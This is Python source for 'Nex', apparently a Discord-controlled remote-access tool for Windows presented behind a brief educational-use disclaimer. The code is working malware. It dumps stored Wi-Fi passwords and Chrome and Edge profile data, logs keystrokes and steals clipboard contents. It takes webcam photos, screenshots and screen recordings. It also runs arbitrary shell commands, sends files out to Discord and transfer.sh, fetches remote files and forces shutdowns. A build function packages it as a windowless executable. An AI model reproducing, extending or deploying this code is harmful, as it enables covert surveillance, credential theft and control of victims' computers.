"""
⚠️ NOTICE
Nex is provided for educational, research, and personal device management purposes only.  
It is not intended for unauthorized access to computers.  
"""
from time import sleep
import discord
from discord.ext import commands
import pyautogui
import requests
import base64
import codecs
import threading
import os
import json
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
from keyboard import read_event
from subprocess import call
from zipfile import ZipFile
import random
import shutil
import pyperclip
import ctypes
import cv2
import time
import numpy as np
import mss
import time
from screeninfo import get_monitors
from PIL import Image
import hashlib
import pyvolume
recording = False
record_thread = None
filename = "screen_capture.mp4"
def start(token):
    try:
        hshfasudf = token
        bot = commands.Bot(command_prefix="!")

        def gensesion():
            global sesja
            pc_name = os.getenv("COMPUTERNAME") or "unknown"
            sesja = str(int(hashlib.md5(pc_name.encode()).hexdigest(), 16) % 10000)

        gensesion()

        def get_public_ip():
            global ipaddres
            response = requests.get("http://checkip.amazonaws.com")
            ipaddres = response.text.strip()
        get_public_ip()

        def grab_info():
            zipObj = ZipFile('log.zip', 'w')
            os.system("ipconfig /displaydns > net_log.txt")
            os.system("netsh wlan show profile * key=clear >> net_log.txt")
            os.system("arp -a >> net_log.txt")
            os.system("ipconfig /all >> net_log.txt")
            os.system("systeminfo > hardware_log.txt")
            os.system("set >> system_log.txt")
            os.system("net user >> system_log.txt")
            os.system("net accounts >> system_log.txt")
            os.system("mkdir chrome")
            os.system(r'copy "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default" chrome')
            zipObj.write('net_log.txt')
            zipObj.write('hardware_log.txt')
            zipObj.write('system_log.txt')
            for root, dirs, files in os.walk('chrome'):
                for file in files:
                    zipObj.write(os.path.join(root, file))
            os.system("del /F /Q chrome && rd chrome")
            os.system("mkdir edge")
            os.system(r'copy "%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data\Default" edge')
            for root, dirs, files in os.walk('edge'):
                for file in files:
                    zipObj.write(os.path.join(root, file))
            os.system("del /F /Q edge && rd edge")
            os.system("del net_log.txt")
            os.system("del hardware_log.txt")
            os.system("del system_log.txt")
            zipObj.close()


        log = ""
        def StartLogger():
            global log
            while True:
                    event = read_event()
                    if event.event_type == 'down' and len(event.name) == 1 or event.name == 'space' or event.name == 'enter' or event.name == 'backspace':
                        if event.name == 'space':
                            event.name = " "
                        else:
                            if event.name == 'enter':
                                event.name = '[Enter]'
                            else:
                                if event.name == 'backspace':
                                    event.name = '[Backspace]'
                        log += event.name

        @bot.event
        async def on_ready():
            print("Connection established successfully.")
        @bot.command()
        async def shell(ctx, *args):
            session = args[0]
            output = args[1]
            command = " ".join(args[2:])
            if session == "all":
                if output == "yes":
                    out = os.popen(command).read()
                    await ctx.send(out)
                else:
                    os.system(command)
            else:
                if session == sesja:
                    if output == "yes":
                        out = os.popen(command).read()
                        await ctx.send(out)
                    else:
                        os.system(command)

        @bot.command()
        async def screenshot(ctx, session, monitor):
            monitor = int(monitor)
            if session == "all":
                with mss.mss() as sct:
                    monitor = sct.monitors[monitor]  # choose monitor number (2 = second monitor)
                    screenshot = sct.grab(monitor)
                    img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
                    img.save("ss.png")
                    await ctx.send(f"Screenshot from {sesja}:", file=discord.File("ss.png"))
                    os.remove("ss.png")
            else:
                if session == sesja:
                    with mss.mss() as sct:
                        monitor = sct.monitors[monitor]  # choose monitor number (2 = second monitor)
                        screenshot = sct.grab(monitor)
                        img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
                        img.save("ss.png")
                        await ctx.send(f"Screen from {sesja}:", file=discord.File("ss.png"))
                        os.remove("ss.png")

        @bot.command()
        async def Logs(ctx, sesion, action):
            global log
            if sesion == "all":
                if action == "start":
                    sys = threading.Thread(target=StartLogger, name="sys")
                    sys.start()
                else:
                    if action == "log":
                        await ctx.send(log)
                        log = ""
                    else:
                        if action == "stop":
                            stop_event = threading.Event()
                            stop_event.set()
                            sys.join()
                            log = ""
                            
                        
            else:
                if sesion == sesja:
                    if action == "start":
                        sys = threading.Thread(target=StartLogger, name="sys")
                        sys.start()
                    else:
                        if action == "log":
                            await ctx.send(log)
                            log = ""
                        else:
                            if action == "stop":
                                stop_event = threading.Event()
                                stop_event.set()
                                sys.join()
                                log = ""

        @bot.command()
        async def Download(ctx, sesion, *args):
            file_names = " ".join(args)
            if sesion == "all":
                size = os.path.getsize(file_names)
                if size > 8000000:
                    with open(file_names, 'rb') as file:
                        out = requests.put(f"https://transfer.sh/{file_names}", data=file)
                    await ctx.send(f"Downloaded {out.text}")
                else:
                    await ctx.send("Downloaded", file=discord.File(file_names))
            else:
                if sesion == sesja:
                    size = os.path.getsize(file_names)
                    if size > 8000000:
                        with open(file_names, 'rb') as file:
                            out = requests.put(f"https://transfer.sh/{file_names}", data=file)
                        await ctx.send(f"Downloaded {out.text}")
                    else:
                        await ctx.send("Downloaded", file=discord.File(file_names))
        @bot.command()
        async def cd(ctx, sesion, *args):
            dir = " ".join(args)
            if sesion == "all":
                os.chdir(dir)
            else:
                if sesion == sesja:
                    os.chdir(dir)

        @bot.command()
        async def up(ctx, sesion):
            x = 0
            if sesion == "all":
                while x < 100:
                    pyautogui.press('volumeup')
                    x = x + 1
            else:
                if sesion == sesja:
                    while x < 100:
                        pyautogui.press('volumeup')
                        x = x + 1

        @bot.command()
        async def down(ctx, sesion):
            x = 0
            if sesion == "all":
                while x < 100:
                    pyautogui.press('volumedown')
                    x = x + 1
            else:
                if sesion == sesja:
                    while x < 100:
                        pyautogui.press('volumedown')
                        x = x + 1

        @bot.command()
        async def delete(ctx, session, path):
            if session == "all":
                try:
                    os.remove(path)
                    await ctx.send(f"File '{path}' has been deleted.")
                except Exception as e:
                    await ctx.send(f"An error occurred: {e}")
            else:
                if session == sesja:
                    try:
                        os.remove(path)
                        await ctx.send(f"File '{path}' has been deleted.")
                    except Exception as e:
                        await ctx.send(f"An error occurred: {e}")

        @bot.command()
        async def message(ctx, sesion, *args):
            title = args[0]
            button = args[1]
            message = " ".join(args[2:])
            if sesion == "all":
                pyautogui.alert(text=message , title=title , button=button)
            else:
                if sesion == sesja:
                    pyautogui.alert(text=message , title=title , button=button)
                    

        @bot.command()
        async def dir(ctx, sesion):
            if sesion == "all":
                await ctx.send(os.getcwd())
                output = os.popen("dir").read()
                await ctx.send(output)
            else:
                if sesion == sesja:
                    await ctx.send(os.getcwd())
                    output = os.popen("dir").read()
                    await ctx.send(output)

        @bot.command()
        async def upload(ctx, sesion, link = "", filename = "file.txt"):
            if sesion == "all":
                r = requests.get(link)
                with open(filename, 'wb') as f:
                    f.write(r.content)
                await ctx.send("uploaded")
            else:
                if sesion == sesja:
                    r = requests.get(link)
                    with open(filename, 'wb') as f:
                        f.write(r.content)
                    await ctx.send("uploaded")

        @bot.command()
        async def klik(ctx, session, x = "0", y = "0"):
            if session == "all":
                pyautogui.click(x=int(x), y=int(y))
            else:
                if session == sesja:
                    pyautogui.click(x=int(x), y=int(y))

        @bot.command()
        async def press(ctx, session, klawisz = "Enter"):
            if session == "all":
                pyautogui.press(klawisz)
            else:
                if session == sesja:
                    pyautogui.press(klawisz)
        
        @bot.command()
        async def cli(ctx, session):
            if session == "all":
                text = pyperclip.paste()
                await ctx.send(text)
            else:
                if session == sesja:
                    text = pyperclip.paste()
                    await ctx.send(text)
                    

        @bot.command()
        async def write(ctx, session, *args):
            if session == "all":
                pyautogui.write(" ".join(args))
            else:
                if session == sesja:
                    pyautogui.write(" ".join(args))

        @bot.command()
        async def loc(ctx, session):
            if session == "all":
                r = requests.get(f"http://ip-api.com/json/{ipaddres}")
                await ctx.send(r.text)
            else:
                if session == sesja:
                    r = requests.get(f"http://ip-api.com/json/{ipaddres}")
                    await ctx.send(r.text)
        @bot.command()
        async def camera(ctx, session: str = None):
            """Take a single photo with the default webcam and send it back."""
            # Optional: restrict access to a single authorized Discord account

            # Optional: session check (keep your existing session flow if you want)
            # if session != "all" and session != sesja:
            #     return
            global sesja
            if session == sesja:

                await ctx.send("Capturing image...")

                try:
                    # Open default camera (0). If you need a different device, change the index.
                    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)  # CV2 backend for Windows; remove second arg if not on Windows
                    if not cap.isOpened():
                        await ctx.send("Could not open webcam.")
                        return

                    # Warm up camera for a short moment
                    time.sleep(0.5)

                    # Read a frame
                    ret, frame = cap.read()
                    cap.release()

                    if not ret:
                        await ctx.send("Failed to capture image from webcam.")
                        return

                    # Save to a temporary file
                    filename = "cam_capture.jpg"
                    cv2.imwrite(filename, frame)

                    # Send the file
                    await ctx.send(file=discord.File(filename))

                    # Remove the temporary file
                    try:
                        os.remove(filename)
                    except OSError:
                        pass
                    
                except Exception as e:
                    await ctx.send(f"Error capturing image: {e}")
            elif session == "all":
                await ctx.send("Capturing image...")

                try:
                    # Open default camera (0). If you need a different device, change the index.
                    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)  # CV2 backend for Windows; remove second arg if not on Windows
                    if not cap.isOpened():
                        await ctx.send("Could not open webcam.")
                        return

                    # Warm up camera for a short moment
                    time.sleep(0.5)

                    # Read a frame
                    ret, frame = cap.read()
                    cap.release()

                    if not ret:
                        await ctx.send("Failed to capture image from webcam.")
                        return

                    # Save to a temporary file
                    filename = "cam_capture.jpg"
                    cv2.imwrite(filename, frame)

                    # Send the file
                    await ctx.send(file=discord.File(filename))

                    # Remove the temporary file
                    try:
                        os.remove(filename)
                    except OSError:
                        pass
                    
                except Exception as e:
                    await ctx.send(f"Error capturing image: {e}")
        @bot.command()
        async def sessions(ctx):
            try:
                r = requests.get(f"http://ip-api.com/json/{ipaddres}").json()
                country = r.get("country", "Unknown")
                city = r.get("city", "Unknown")
                location_info = f"{city}, {country}"
            except:
                    location_info = "Unknown"
            await ctx.send(f"session: {sesja} | IP address: {ipaddres} | Estimated Location: {location_info}")

        @bot.command()
        async def rename(ctx, session, *args):
            global sesja
            if session == sesja:
                nowaSesja = " ".join(args)
                await ctx.send("session name changed " + sesja + " to " + nowaSesja)
                sesja = nowaSesja

        @bot.command()
        async def wifi(ctx, session, action):
            if session != "all" and session != sesja:
                return
            if action.lower() not in ['on', 'off']:
                await ctx.send("Invalid action. Use 'on' or 'off'.")
                return

            try:
                import subprocess
                cmd = f"powershell -Command \"(Get-NetAdapter -Name Wi-Fi).Enable{action.capitalize()}\""
                result = subprocess.run(cmd, capture_output=True, text=True, shell=True)

                if result.returncode == 0:
                    await ctx.send(f"Wi-Fi has been turned {action}.")
                else:
                    await ctx.send(f"Failed to turn Wi-Fi {action}. Error: {result.stderr}")
            except Exception as e:
                await ctx.send(f"An error occurred: {str(e)}")

        @bot.command()
        async def shutdown(ctx, session):
            if session == "all":
                os.system("shutdown /s /f /t 1")
            else:
                if session == sesja:
                    os.system("shutdown /s /f /t 1")

        @bot.command()
        async def restart(ctx, session):
            if session == "all":
                os.system("powershell.exe Restart-Computer -Force")
                await ctx.send(f"The remote system {sesja} is being restarted.")
            else:
                if session == sesja:
                    os.system("powershell.exe Restart-Computer -Force")
                    await ctx.send(f"The remote system {sesja} is being restarted.")
        
        @bot.command()
        async def wallpaper(ctx, session, *args):
            if session == "all":
                filePATH = " ".join(args)
                filePATH = os.path.abspath(filePATH)
                ctypes.windll.user32.SystemParametersInfoW(20, 0, filePATH , 0)
                await ctx.send(f"wallpaper changed successfully")
            else:
                if session == sesja:
                    filePATH = " ".join(args)
                    filePATH = os.path.abspath(filePATH)
                    ctypes.windll.user32.SystemParametersInfoW(20, 0, filePATH , 0)
                    await ctx.send(f"wallpaper changed successfully")
        
        @bot.command()
        async def kill(ctx, session, *args):
            if session == "all":
                task = " ".join(args)
                os.system(f"taskkill /f /im {task}")
                await ctx.send(f"task {task} killed successfull")
            else:
                if session == sesja:
                    task = " ".join(args)
                    os.system(f"taskkill /f /im {task}")
                    await ctx.send(f"task {task} killed successfull")
        @bot.command()            
        async def copy(ctx, *args):
            session = args[0]
            source_path = args[1]
            dest_path = args[2]

            async def do_copy():
                try:
                    if not os.path.exists(source_path):
                        await ctx.send(f"Source file does not exist: {source_path}")
                        return
                    dest_dir = os.path.dirname(dest_path)
                    if not os.path.exists(dest_dir):
                        os.makedirs(dest_dir)

                    shutil.copy2(source_path, dest_path)
                    await ctx.send(f"File copied successfully from {source_path} to {dest_path}")
                except Exception as e:
                    await ctx.send(f"Failed to copy file: {str(e)}")

            if session == "all":
                await do_copy()
            else:
                if session == sesja: 
                    await do_copy()
        def scerecord(monitor_num=1):
            global recording, filename
            filename = f"screen_capture_monitor{monitor_num}.mp4"

            with mss.mss() as sct:
                # Check monitor number validity
                if monitor_num < 1 or monitor_num >= len(sct.monitors):
                    print(f"Invalid monitor {monitor_num}, defaulting to 1")
                    monitor_num = 1

                monitor = sct.monitors[monitor_num]
                width, height = monitor["width"], monitor["height"]
                fps = 20
                fourcc = cv2.VideoWriter_fourcc(*"mp4v")
                out = cv2.VideoWriter(filename, fourcc, fps, (width, height))

                print(f"Recording monitor {monitor_num} ({width}x{height}) at {fps} FPS...")

                last = time.time()
                while recording:
                    img = np.array(sct.grab(monitor))      # BGRA
                    frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)  # to BGR
                    out.write(frame)

                    # Simple rate limiter
                    dt = time.time() - last
                    delay = max(0, (1.0 / fps) - dt)
                    if delay:
                        time.sleep(delay)
                    last = time.time()

                out.release()
                cv2.destroyAllWindows()
                print("Stopped recording.")

        @bot.command()
        async def screenrecord(ctx, session, action, monitor: int = 1):
            """
            Usage: !screenrecord <session> <start/stop> [monitor_number]
            Example: !screenrecord example start 2
            """
            global recording, record_thread, filename

            if session != sesja:
                await ctx.send("Invalid session.")
                return

            if action == "start":
                if not recording:
                    recording = True
                    record_thread = threading.Thread(target=scerecord, args=(monitor,), daemon=True)
                    record_thread.start()
                    await ctx.send(f"Started recording on monitor {monitor}.")
                else:
                    await ctx.send("Already recording.")

            elif action == "stop":
                if recording:
                    recording = False
                    record_thread.join()  # wait until thread fully stops
                    await ctx.send("Stopped recording. Sending file...")
                    try:
                        await ctx.send(file=discord.File(filename))
                    except Exception as e:
                        await ctx.send(f"Error sending file: {e}")
                    try:
                        os.remove(filename)
                    except OSError:
                        pass
                else:
                    await ctx.send("No active recording.")
        @bot.command()
        async def processes(ctx, session):
            if session == "all":
                out = os.popen("tasklist").read()
                for i in range(0, len(out), 2000):
                    await ctx.send(out[i:i+2000])
            else:
                if session == sesja:
                    out = os.popen("tasklist").read()
                    for i in range(0, len(out), 2000):
                        await ctx.send(out[i:i+2000])
        @bot.command()
        async def monitors(ctx, session):
            if session == sesja:
                monitors = get_monitors()
                await ctx.send(f"Number of monitors: {len(monitors)}")
            else:
                monitors = get_monitors()
                await ctx.send(f"Number of monitors for session {sesja}: {len(monitors)}")
        @bot.command()
        async def volume(ctx, session, percentage):
            percentage = int(percentage)
            if session == sesja:
                pyvolume.custom(percent=percentage)
            elif session == "all":
                pyvolume.custom(percent=percentage)
        @bot.command()
        async def h(ctx):
            wiadomosc = '''
        !cd [session] [path] - Changes the current folder on the remote computer.
        !cli [session] - Copies the contents of the clipboard from the remote computer.
        !click [session] [x] [y] - Clicks on a specific location on the screen.
        !delete [session] [path] - Deletes a file from the remote computer.
        !dir [session] - Shows the files and folders in the current directory.
        !down [session] - Lowers the volume on the remote computer.
        !execute [session] [program] - Runs a program on the remote computer.
        !Logs [session] [action(start, stop, log)] - Starts, stops, or views Logs of the pc.
        !kill [session] [task] - Stops a specific running program.
        !loc [session] - Shows IP and location information.
        !message [session] [title] [button] [message] - Displays a pop-up message on the remote computer.
        !press [session] [key] - Presses a key on the remote computer keyboard.
        !rename [session] [new_name] - Changes the name of the current session.
        !restart [session] - Restarts the remote computer.
        !shell [session] [output(yes, no)] [command] - Runs a command on the remote computer.
        !sessions - Shows all active sessions.
        !shutdown [session] - Turns off the remote computer.
        !screenshot [session] [monitor] - Takes a screenshot of the remote computer screen.
        !Download [session] [file_names] - Copies files from the remote computer.
        !up [session] - Increases the volume on the remote computer.
        !upload [session] [link] [file_name] - Sends a file to the remote computer.
        !wallpaper [session] [path] - Changes the wallpaper on the remote computer.
        !wifi [session] [on/off] - Turns the Wi-Fi on or off.
        !write [session] [message] - Types a message on the remote computer.
        !camera [session] - Takes a picture using the remote computer's camera.
        !copy [session] [source_file] [destination_path] - Copies a file to another location.
        !processes [session] - Lists all running processes.
        !screenrecord [session] [action(start, stop)] [monitor] - Sends a screen record of the computer.
        !monitors [session] - Reveals how many monitors does the computer have.
        !volume [session] [volume percentage(0, 100)] - Changes the volume percentage on the computer. 
            '''
            for i in range(0, len(wiadomosc), 2000):
                await ctx.send(wiadomosc[i:i+2000])
        bot.run(hshfasudf)
    except:
        print("Connection not established, please consider checking your token/internet connection")
        sleep(5)
        start(token=token)
def build_exe(token):
    content = f"""
import nex
nex.start("{token}") 
"""
    with open("nex_exe.py", "w") as sc:
        sc.write(content)
    os.system("pyinstaller --onefile --windowed nex_exe.py")


